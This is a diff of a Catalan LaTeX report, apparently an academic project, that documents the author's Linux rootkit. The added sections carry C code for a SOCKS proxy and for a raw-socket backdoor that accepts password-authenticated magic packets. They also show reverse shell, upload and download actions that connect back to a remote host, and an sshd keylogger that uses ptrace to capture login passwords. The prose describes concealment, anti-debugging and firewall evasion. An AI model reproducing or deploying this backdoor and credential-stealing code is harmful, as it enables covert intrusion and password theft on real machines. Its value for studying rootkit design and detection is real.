@@ -319,7 +319,7 @@ printf(@PYaB["]@PYao[\n]@PYaB["]);
     \caption{client.c::get\_pass()}
     \label{fig:client_get_pass}
 \end{figure}
-
+ 
 \subsection{Detecció del rootkit}
 Per tal de detectar si hi ha un rootkit en execució en una màquina remota, s'ha implementat una acció
 que pot ser executada independentment del password utilitzat. Com s'ha comentat en punts
@@ -533,7 +533,7 @@ Per tal de portar a terme les tasques programades, el rootkit intenta llançar u
 nom de l'arxiu ens indica. Aquesta execució es realitza programant un alert diàriament tot incrementant uns contadors de tal manera que quan hagi passat el temps, s'executarà l'script necessari utilitzant la crida ``system()'' 
 
 Aquests scripts els busca en el directory arrel del home del rootkit (també demanat en el moment de la configuració), i en cas de no ser-hi, no passa res.
- 
+  
 \subsection{Ocultació}
 Per tal d'evitar que el rootkit sigui detectat, s'han implementat diferents tècniques:
 \begin{enumerate}
@@ -573,7 +573,7 @@ intencionada, que és el què està viatjant per la xarxa.
 Al ser executat, el launcher elimina tota variable d'entorn per tal que no es pugui tenir cap pista de què és el procés.
 \end{enumerate} 
 
-
+ 
 \subsection{Heard beat}
 Per implementar el heard beat, s'han utilitzat les tasques programades de periodicitat mensual. En l'script
 .monthly, s'ha afegit la comanda de la figura XXX
@@ -593,61 +593,336 @@ una shell a l'estil sh, però d'un tamany molt reduit} per a poder-se afegir din
 
 En el moment en què es compila el rootkit, aquest ens demana si volem incloure una shell dintre seu, i en
 cas de voler, incorpora el codi basat en dash. Com sempre aquest codi també es estàtic i compilat utilitzant
-la llibreria dietlibc.
+la llibreria dietlibc. \\
+
+Els canvis que han estat necessaris per tal d'incloure la shell dash en el rootkit, són uns canvis força
+metòdics i que no aporten gaire valor afegit. En cas d'interessar, es pot consultar directament al codi.\\
 
 \subsection{Proxy socks}
+Per a afegir aquesta funcionalitat al nostre rootkit, s'ha intentat (igual que en el cas anterior), buscar
+un software existent que ens oferis la funcionalitat desitjada. El problema que hem tingut en el cas del servei de
+socks, és que els paquets disponibles, ofereixen moltíssimes altres funcionalitats que nosaltres no
+necessitem. Aquest mateix fet, feia molt costós el modificar el codi per a tenir un servei socks simple, i 
+per aquest motiu s'ha decidit implementar des de zero tot el protocol. Cal tenir en compte però,
+que el protocol socks, és un protocol força senzill. \\
 
+El primer a fer, ha estat buscar les especificacions formals del protocol\footnote{Les especificacions 
+formals}. Un cop localitzades, i estudiades, s'ha decidit implementar la versió 4 i la versió 4a ja 
+que ofereixen exactament el què necessitem. \\
 
+Com veurem a continuació, la diferència entre la versió 4 i 4a, rau en què la versió 4, el servei de socks
+espera rebre una direcció on connectar-se, i en la 4a rep un domini que el propi servei de socks ha de
+resoldre. Ambdues versions del protocol, en un primer moment el client envia una capçalera, i un cop enviada,
+si el servei de socks és capaç de establir-hi una connexió, la connexió que ha inicilitzat el client, es
+transforma en la connexió que ha solicitat sent el servidor socks, un intermediari.
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+@PYaJ[void] @PYaL[pthread_socks](@PYaJ[void] @PYbe[*]sock) {
+    @PYay[struct] message req;
+    @PYay[struct] in_addr in;
+
+    @PYaE[// read client packet]
+    read((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](@PYay[struct] message));
+    @PYaJ[char] buf@PYZlb[]@PYag[4]@PYZrb[];
+    read((@PYaJ[int])sock, buf, @PYag[4]);
+    print_message(@PYbe[&]req);
+
+    @PYaE[// if client is using socks4a]
+    in.s_addr @PYbe[=] req.dstip;
+    @PYay[if] (strstr(inet_ntoa(in), @PYaB["]@PYaB[0.0.0]@PYaB["])) {
+		@PYaJ[char] dstip4a@PYZlb[]@PYag[1024]@PYZrb[];
+		read((@PYaJ[int])sock, dstip4a, @PYag[1024]);
+		req.dstip @PYbe[=] resolve(dstip4a, @PYag[0]);
+	}
+
+    @PYaE[// socks]
+    @PYaJ[int] sock2;
+    @PYay[if] ((sock2 @PYbe[=] launcher_rcon(req.dstip, ntohs(req.dstport))) @PYbe[>] @PYag[0]) {
+        debug(@PYaB["]@PYaB[Connected!]@PYao[\n]@PYaB["]);
+        req.cd @PYbe[=] @PYag[90];
+        write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
+        socks_forward((@PYaJ[int])sock, sock2);
+    } @PYay[else] {
+        debug(@PYaB["]@PYaB[ERROR!]@PYao[\n]@PYaB["]);
+        req.cd @PYbe[=] @PYag[91];
+        write((@PYaJ[int])sock, @PYbe[&]req, @PYay[sizeof](req));
+    }
+    close((@PYaJ[int])sock);
+    close(sock2);
+    exit(@PYag[0]);
+}
+\end{Verbatim}
+    \caption{socksd.c::pthread\_socks()}
+    \label{fig:socksd}
+\end{figure}
+
+En la figura \ref{fig:socksd} es mostra la funció més caracteristica d'aquesta funcionalitat, ja que és 
+la funció que interpreta les capçaleres socks4 i socks4a. En ella, podem veure com omplim l'estructura
+message amb la capçalera que ens envia el client. Just després, es comproba si la destinació és una 
+destinació vàlida o no, i en cas de no ser-ho, es llegeix més enllà de la capçalera on si espera trobar 
+el nom DNS del host on establir la connexió. \\
+Com podem veure, just abans de passar a reenviar incondicionalment tot el tràfic entre els dos cantons
+de la conneixó, cal que enviem al client, un missatge comunicant-li si la connexió s'ha pogut establir
+o no.
 
 \section{Entorn privilegiat}
-- En aquest cas tenim un raw socket (mostrar el bucle) 
-- Mostrar el do\_action que s'executa depenent de l'acció
-\subsection{Connexió inversa}
-- Referencia a l'explicació
-- Per establir una connexió inversa...
-- Mostrar la peculiaritat del revers del launcher
-- Mostrar la part client
+En l'entorn privilegiat, el nostre rootkit s'aprofita de la possibilitat de poder utilitzar raw sockets 
+per tal d'implementar modes de comunicació pensats per comunicar-se amb sistemes molt protegits i xarxes 
+molt restrictives, i de la possibilitat de debugar serveis del sistema. \\
 
-\subsection{Tècniques per evitar firewalls i filtres}
-- Referencia a l'explicació
-- 
+Una descripció més conceptual del funcionament d'aquest protocol de comunicació, ha estat comentada en 
+detall i amb l'ajuda d'esquemes en l'apartat de disseny del rootkit (POSAR REFERÈNCIA). Per al major 
+aprofitament d'aquest punt, se'n recomana la lectura. \\
 
-CANVIAR AQUEST NOM AQUÍ I A FUNCIONALITATS, SI ES RAWSOCKET POSAR UNA ALTRE COSA
-Per tal de permetre la comunicació a través de ports ja oberts i utilitzats per altres programes, així com per ports tancats però accessibles, s'han
-implementat dos modes de treball que utilitzen un RAW socket.
+\subsection{Modes de comunicació}
+Tal i com es pot veure en la figura \ref{fig:launcher_raw_daemon} , el rootkit en execució en un entorn 
+privilegiat, es troba executant un while on cada paquet de xarxa que arriba a la màquina (independentment
+de si el port de destí està obert o no), la funció recvfrom el rep. Com que la majoria de paquets que
+rebrà una màquina, no seran paquets nostres, ens interessa que aquesta funció tingui la menor latencia 
+possible per afectar el mínim possible a la màquina on corri el nostre rootkit. \\
 
-\subsubsection{Direct RAW socket}
-En aquest mode de funcionament, he implementat un pseudo protocol de transport que utilitza un subset dels paquets utilitzats pel protocol TCP, de tal
-manera que utilitzant aquest protocol, podem passar per internet. 
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+sock @PYbe[=] socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+@PYay[if] (sock @PYbe[<] @PYag[0]) {
+    debug(@PYaB["]@PYaB[Can't allocate raw socket]@PYao[\n]@PYaB["]);
+    exit(@PYbe[-]@PYag[1]);
+}
 
-Alguns dels abantatges que ens afegeix haver implementat això, són:
-\begin{itemize}
-\item El kernel del sistema operatiu no té ni idea de les connexions que estan establertes i les què no. D'aquesta manera no es mostren per
-enlloc. L'única manera d'enterar-se, és utilitzar un analitzador de xarxa, i veure que el trànsit que hi ha no és vàlid.
-\item Això ens permet utilitzar el rootkit encara que la màquina on s'executi no tingui cap port obert, només ens cal que a nivell de xarxa, 
-els paquets arribin físicament a la màquina.
-\end{itemize}
+antidebug_obfuscate_analysis(@PYag[16]);
 
-Les únies coses que hem de tenir en compte, és que per treballar així, necessitem que els paquets de tornada també arribin a la nostre màquina 
-(no necessitem un port obert, però necessitem que els paquets arribin a la nostre màquina), i que per aquest mètode de funcionament, el client 
-també necessita permisos d'administrador ja que ha d'utilitzar un raw socket.
+@PYay[while] (@PYag[1]) {
+    size @PYbe[=] recvfrom(sock, @PYbe[&]p, @PYay[sizeof](p), @PYag[0], (@PYay[struct] sockaddr @PYbe[*]) @PYbe[&]raw, @PYbe[&]slen);
+    @PYaE[// Si el tamany del paquet es el que toca]
+    @PYay[if] (size @PYbe[=]@PYbe[=] @PYay[sizeof](@PYay[struct] packet)) {
+        @PYaE[// I el password és correcte]
+        @PYay[if] (@PYbe[!]memcmp(CLIENTAUTH, p.action.pass, @PYag[20])) {
+            debug(@PYaB["]@PYaB[S'ha rebut el paquet d'autenticat (action: %d)]@PYao[\n]@PYaB["], p.action.action);
+            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
+        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
+            debug(@PYaB["]@PYaB[S'ha rebut el paquet de CHECK]@PYao[\n]@PYaB["]);
+            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
+		}
+    }
+}
+\end{Verbatim}
+    \caption{launcher.c::raw\_daemon()}
+    \label{fig:launcher_raw_daemon}
+\end{figure}
 
-MOSTRAR GRAFIC DE ARQUITECTURA
+La primera comprobació que es fa, és la del tamany de paquet. Si el tamany de paquet rebut no és exactament
+la dels nostres paquets, aquest paquet ja pot ser descartat. Gràcies a això, podem descartar la majoria de 
+paquets que no van destinats al rootkit. En cas que un paquet ocupi exactament com els nostres paquets, 
+caldrà comprobar si es tracta d'un paquet autenticat amb la contrasenya escollida en el moment de la 
+compilació (CLIENTAUTH) o si es tracta d'una comprobació per veure si el rootkit està instal·lat o no 
+(independentment de coneixer la contrasenya o no). \\
 
-EXPLICAR PROTOCOL
+Un cop ens arribi un paquet autenticat, d'aquest se li extreu el típus d'acció a executar.
+
+\subsubsection{Mode de comunicació REV}
+En cas que en el paquet rebut es soliciti realitzar una acció de tipus reversa, el primer que caldrà fer
+és establir una connexió amb l'origen del paquet. \\
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+@PYay[case] REVUPLOAD:
+	@PYay[if] (fork()) @PYay[return];
+    debug(@PYaB["]@PYaB[Reverse uploading file]@PYao[\n]@PYaB["]);
+    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
+        launcher_upload(sock, sock, (@PYaJ[char] @PYbe[*])d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
+        close(sock);
+    }
+    @PYay[break];
+@PYay[case] REVDOWNLOAD:
+	@PYay[if] (fork()) @PYay[return];
+    debug(@PYaB["]@PYaB[Reverse downloading file]@PYao[\n]@PYaB["]);
+    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
+        launcher_download(sock, sock, (@PYaJ[char] @PYbe[*])d@PYbe[-]@PYbe[>]bytes, d@PYbe[-]@PYbe[>]size);
+        close(sock);
+    }
+    @PYay[break];
+@PYay[case] REVSHELL:
+	@PYay[if] (fork()) @PYay[return];
+    debug(@PYaB["]@PYaB[Launching reverse shell]@PYao[\n]@PYaB["]);
+    @PYay[if] ((sock @PYbe[=] launcher_rcon(ip@PYbe[-]@PYbe[>]s_addr, d@PYbe[-]@PYbe[>]port))) {
+        launcher_shell(sock, sock);
+        close(sock);
+    }
+    @PYay[break];
+\end{Verbatim}
+    \caption{launcher.c::do\_action()}
+    \label{fig:launcer_do_rev_action}
+\end{figure}
+
+Podem veure en la figura \ref{fig:launcer_do_rev_action} que aquesta conneixó serà establerta utilitzant
+la funció launcher\_rcon() que un cop estableixi la connexió amb l'origen del paquet (ip->s\_addr i d->port)
+retorna un socket que és el què serà utilitzat.
 
 
-\subsubsection{Reverse TCP socket}
-En aquest mode de funcionament, el packet RAW només és utilitzat per a rebre el paquet màgic a través d'un port utilitzat per un altre procés. En aquest 
-cas, el client tampoc necessita tenir permisos d'administrador, ja que ell fa una connexió totalment lícita, simplement que el contingut que envia
-el client, és interpretat per el servidor de tal manera que aquest la utilitzar per a establir una connexió TCP cap al client.
-
-MOSTRAR GRÀFIC DE ARQUITECTURA
+\subsubsection{Mode de comunicació RAW}
  
 \subsection{Keylogger}
+La idea que hi havia a l'hora d'implementar el keylogger, era que aquest no s'implementés com a mòdul o
+utilitzant la injecció de codi en el kernel, ja que aquesta tècnica depen molt de la versió de kernel que 
+s'estigui utilitzant en un moment donat. Com que per aquest funcionalitat disposem de accés de root, podem
+fer gairebé qualsevol cosa a nivell d'usuari, i per aquest motiu, pensavem que seria possible. \\
+
+Cal dir que l'objectiu principal per aquesta funcionalitat, es el de permetre'ns recuperar el password de l'usuari
+root o almenys la d'algun usuari del sistema. Per aquest motiu, el servei que s'ha posat com a objectiu, ha estat el OpenSSH\footnote{Openssh .....}
+Aquest servei s'acostuma a trobar instal·lat a la majoria de màquines UNIX i permet a usuaris de sistema
+autenticar-se per a usar i administrar la màquina. Cal tenir en compte que aquest servei és considerat seguir
+ja que utilitzar algoritmes criptogràfics així com claus públiques i privades.\\
+
+La primera opció que es va seguir per tal de poder llegir els passwords del sistema, va ser intentar 
+interceptar totes les escriptures a els dispositius tipus tty o pts. Aquests dispositius són els què reben 
+les dades ja en clar i comuniquen el servei de Openssh amb la shell del sistema. \\
+La idea era comprobar quins dispositius estava utilitzant l'ssh i començar a llegir d'ells, el problema que
+varem tenir, és que si el nostre keylogger llegia del dispositiu, llavors l'aplicació en qüestió no revia les
+dades, sinó que l'únic que les revia era el keylogger. El primer que es va intentar per arreglar això,
+va ser intentar un cop llegides les dades, ser capaços de escriure-les a algun altre lloc per a què
+l'aplicació les acabés rebent, el què passa és que el funcionament dels termianls tty y pts, estan pensants
+justament per evitar això.\\
+
+En definitiva això permetria recuperar el password, però alhora deixa inhabilitat el servei denegant així 
+totes les possibles noves connexions. \\
+
+La segona opció que teníem ja va resultar. Aquesta tractava de que el nostre keylogger debuggués l'aplicació
+en qüestió podent així interceptar cada crida al sistema, i poder seguir l'execució del servei fins al moment
+en què el servei intenta autenticar-se al sistema utilitzant les dades que el client de ssh li ha passat. \\
+
+El funcionament del keylogger queda doncs resumit en aquests passos:
+\begin{enumerate}
+\item Busqueda del servei de Openssh.
+\item Inici del debug interceptant totes les crides a sistema.
+\item Traça de les crides clone i read.
+\item Detecció de l'enviament d'un nom d'usuari i password.
+\item Emmagatzemament de les dades capturades en un fitxer xifrat.
+\end{enumerate}
+
+El primer punt és la localització del procés sshd. Per trobar-lo s'ha utilitzat la búsqueda a través del
+directori /proc. Es busca un procés que pengi del procés init, i que tingui el nom de sshd. \\
+
+Un cop trobat aquest procés, el primer que fa el keylogger, és canviar-se el nom de procés a el nom 
+exacte que té el procés que vol debugar. Un cop fet això, cal attachar-s'hi utilitzant la crida de sistemes 
+POSIX ptrace. A partir d'aquest moment, es pot dir que estem debugant el servei. \\
+
+Un cop attachat el keylogger espera que el servei Openssh executi les crides a sistema clone() i read().
+La crida clone() és utilitzada per a crear nous processos per atendre les noves connexions en les què
+hi haurà un usuari intentant-se autenticar. La crida read() és utilitzada per a llegir l'usuari i password
+que l'usuari entra i amb els què es vol autenticar. \\
+
+En el moment que el keylogger detecta que arriba una nova connexió, aquest s'attacha a el nou procés creat
+per a l'Openssh, i el segueix fins a rebre les dades d'autenticació (usuari i password). Un cop els té,
+deixa de debugar el procés i li permet la seva normal execució. \\
+
+Les dades capturades són emmagatzemades en un fitxer relatiu al home del rootkit anomenat ``.k\_sshd''. 
+El contingut d'aquest fitxer està xifrat amb el mateix password que s'utilitza per xifrar el contingut
+dels paquets de xarxa així com per autenticar el client amb el launcher. Per tal de poder accedir de
+manera fàcil al contingut en clar d'aquest fitxer, el propi launcher permet ser llançat per tal de desxifrar
+el fitxer ``.k\_sshd''.
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+@PYaJ[int] check_ssh_password(@PYaJ[unsigned] @PYaJ[char] @PYbe[*]buff, @PYaJ[int] len){
+	@PYaE[// Password string is | uint | chars |]
+	@PYay[if] (len @PYbe[>] @PYag[32] @PYbe[|]@PYbe[|] len @PYbe[<] @PYag[5]) @PYay[return] @PYag[0];
+
+    @PYaE[// ptr points to the last char of the string]
+	@PYaJ[unsigned] @PYaJ[char] @PYbe[*]ptr @PYbe[=] buff@PYbe[+]len@PYbe[-]@PYag[1];
+	@PYay[while] (@PYbe[*]ptr @PYbe[!]@PYbe[=] @PYaT[0x00]) ptr@PYbe[-]@PYbe[-];
+
+	antidebug_obfuscate_analysis(@PYag[11]);
+	@PYaE[// Now we must have two bytes 0x00 at left and one < 0x0f at right]
+	@PYay[if] ( @PYbe[*](ptr@PYbe[-]@PYag[1]) @PYbe[!]@PYbe[=] @PYaT[0x00] @PYbe[|]@PYbe[|] @PYbe[*](ptr@PYbe[-]@PYag[2]) @PYbe[!]@PYbe[=] @PYaT[0x00]) @PYay[return] @PYag[0];
+
+	@PYaE[// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1]
+	@PYay[if] (((buff@PYbe[+]len@PYbe[-]@PYag[1])@PYbe[-](ptr@PYbe[+]@PYag[1])) @PYbe[!]@PYbe[=] @PYbe[*](ptr@PYbe[+]@PYag[1])) @PYay[return] @PYag[0];
+
+    @PYay[if] (useRc4) {
+        rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])RC4KEY, @PYay[sizeof](RC4KEY), @PYbe[&]rc4_crypt);
+        rc4(ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]), @PYbe[&]rc4_crypt);
+    }
+    write(@PYag[1], ptr@PYbe[+]@PYag[2], @PYbe[*](ptr@PYbe[+]@PYag[1]));
+    putchar(@PYac['\n']);
+
+    @PYay[return] @PYag[1];
+}
+\end{Verbatim}
+    \caption{keylogger.c::check\_ssh\_password()}
+    \label{fig:keylogger_check_password}
+\end{figure}
+      
+En la figura \ref{fig:keylogger} es mostra el tros de codi que comproba que l'string llegit és un string 
+de usuari o de password i en cas de ser-ho ho xifra i ho escriu al fitxer en qüestió ja que previament 
+s'hi ha mapejat el descriptor de fitxer 1. Aquesta funció és cridada quan s'intercepta un string llegit per
+un read() per a comprobar que segueix el format que utilitza l'Openssh. \\
+
+Com és evident, per tal de poder desenvolupar el keylogger per l'Openssh, va caldre un gran estudi del 
+comportament d'aquest software per ser capaços de detectar com i quan es transfereixen les dades d'usuari i
+password. \\
+En aquest anàlisis, ens varem donar compte que les dades en clar utilitzades durant l'autenticació, eren
+transferides utilitzant un format en concret que és el què aquesta funció comproba. El format en qüestió
+és TAG + LONGITUD + DADES on les dades és un string. Tenint en compte que un password serà normalment més
+curt que 255 caràcters, i que la longitud està expressada en 4 bytes, aquesta funció comproba que el format
+es compleix. \\
+
+\begin{figure}[htp]
+\begin{Verbatim}[commandchars=@\[\]]
+ptrace(PTRACE_SYSCALL, pid, @PYaX[NULL], @PYaX[NULL]);
+exitPid @PYbe[=] wait(@PYbe[&]status);
+
+antidebug_obfuscate_analysis(@PYag[3]);
+@PYay[if] (WIFSTOPPED(status)) {
+    @PYay[if] (WSTOPSIG(status) @PYbe[=]@PYbe[=] SIGCHLD) {
+        ptrace(PTRACE_CONT, pid, @PYag[0], SIGCHLD);
+        kill(pid, SIGSTOP);
+    } @PYay[else] 
+        @PYay[if] (WSTOPSIG(status) @PYbe[!]@PYbe[=] SIGTRAP @PYbe[&]@PYbe[&]  WSTOPSIG(status) @PYbe[!]@PYbe[=] SIGSTOP) {
+        ptrace(PTRACE_CONT, pid, @PYag[0], WSTOPSIG(status));
+        debug(@PYaB["]@PYaB[Acabant procés pare %d (%d)]@PYao[\n]@PYaB["], pid, WSTOPSIG(status));
+        @PYay[break];
+    }
+    @PYay[else] {
+        orig_eax @PYbe[=] ptrace(PTRACE_PEEKUSER, pid, @PYag[4] @PYbe[*] ORIG_EAX, @PYaX[NULL]);
+
+        antidebug_obfuscate_analysis(@PYag[4]);
+        @PYay[switch] (orig_eax) {
+            @PYay[case] __NR_clone:
+                @PYay[if](insyscall @PYbe[=]@PYbe[=] @PYag[0]) {
+                    debug(@PYaB["]@PYaB[fork]@PYao[\n]@PYaB["]);
+                    insyscall @PYbe[=] @PYag[1];
+                } @PYay[else] {
+                    insyscall @PYbe[=] @PYag[0];
+                    eax @PYbe[=] ptrace(PTRACE_PEEKUSER, pid, @PYag[4] @PYbe[*] EAX, @PYaX[NULL]);
+                    @PYay[if](@PYbe[!]fork()) {
+                        lookForReads(eax);
+                    }
+\end{Verbatim}
+    \caption{keylogger.c::main()}
+    \label{fig:keylogger_main}
+\end{figure}
+
+En la figura \ref{fig:keylogger_main} podem veure com un cop ja estem attachats al procés principal del 
+Openssh, anem seguin les diferents crides a sistema per trobar en aquest cas un clone(). En el moment
+en que es retorni de la crida clone(), capturem el valor del registre eax que correspon al pid del procés
+fill o 0 en cas de ser el propi fill. Quan en el pare obtenim el pid del fill acabat de crear, saltem a la 
+funció lookForReads() tot passant-li el nou pid a seguir. En aquest funció, es crearà un nou procés del 
+nostre keylogger, que segurà exclusivament aquest nou procés que acaba de crear l'Openssh. En aquesta nova
+connexió, ja serà on buscarem les dades que ens interessen. \\
+
+Podem veure en la mateixa figura, que segons el signal que faci aturar el nostre procés, ens interessarà
+que aquest arrivi al procés que estem debugant, o fins i tot, farà que deixem de debugar-lo ja que entendrem
+que es vol aturar el servei. \\
+
+Per acabar, comentar que aquest keylogger s'ha implementat només per i386 i funciona per tota la branca 
+de l'Openssh de la versió 2.x. Tot i això, el fet de passar-la a x86\_64, és trivial i es farà fora de 
+l'àmbit del projecte. També comentar que la intenció és acabar-hi afegint nous serveis per a que el keylogger
+sigui capaç de capturar informació d'altres fonts.
+
 \subsection{Injecció de codi en memòria del nucli}
 En el transcurs del projecte, l'equip que desenvolupa el kernel de Linux, varen aplicar un 
 patch\footnote{\href{Patch que evita l'ús de /dev/mem per accedir a la memòria}{http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=ae531c26c5c2a28ca1b35a75b39b3b256850f2c8}} que evita
 l'accés a la memòria a través de /dev/mem quedant així totalment impossibilitada la tècnica que es volia 
-utilitzar.
-utilitzar per el rootkit.
+utilitzar. 
+
